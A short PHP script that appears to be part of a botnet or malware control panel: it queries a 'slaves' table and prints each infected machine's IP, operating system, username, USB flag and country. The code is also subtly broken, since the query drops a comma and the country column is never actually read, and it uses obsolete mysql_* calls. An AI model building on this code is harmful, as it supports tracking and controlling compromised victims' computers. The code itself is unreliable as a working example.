<?
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
//-------------------------------------------
$get_slaves = "SELECT id, ip, os, date, username, usb, country token FROM slaves";
$slaves = mysql_query($get_slaves, $connect);
while($row = mysql_fetch_array($slaves) ){
 $id = $row[0];
 $ip = $row[1];
 $os = $row[2];
 $date = $row[3];
 $username = $row[4];
 $usb = $row[5];
 $country = $row[6];
 {
  echo $id."|".$ip."|".$os."|".$date."|".$username."|".$usb."|".$country."<br>";
 }
 }
?>